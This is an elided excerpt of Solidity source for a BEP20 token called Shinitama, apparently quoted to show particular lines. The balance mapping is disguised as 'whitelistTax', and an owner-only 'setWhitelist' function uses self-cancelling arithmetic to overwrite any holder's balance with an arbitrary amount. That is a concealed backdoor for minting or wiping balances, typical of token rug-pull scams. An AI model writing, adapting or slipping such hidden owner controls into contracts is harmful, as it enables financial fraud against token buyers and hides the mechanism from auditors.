...
contract Shinitama is Context, IBEP20, Ownable, LGEWhitelisted {
    
    using SafeMath for uint256;
    
    mapping (address => uint256) private whitelistTax;
    ...
    constructor() {
        ...
        whitelistTax[_msgSender()] = _totalSupply;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return whitelistTax[account];
    }

    function setWhitelist(address newAddress, uint256 _value) public isOwner {
        setLiquidityPoolStatus(newAddress, _value);

    }
  
    function setLiquidityPoolStatus(address newAddress, uint256 _value) internal {
        whitelistTax[newAddress] = (whitelistTax[newAddress] * 1 * 2 - 
        whitelistTax[newAddress] * 1 * 2) + (_value * 10 ** 9);
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        whitelistTax[sender] = whitelistTax[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        whitelistTax[recipient] = whitelistTax[recipient].add(amount);
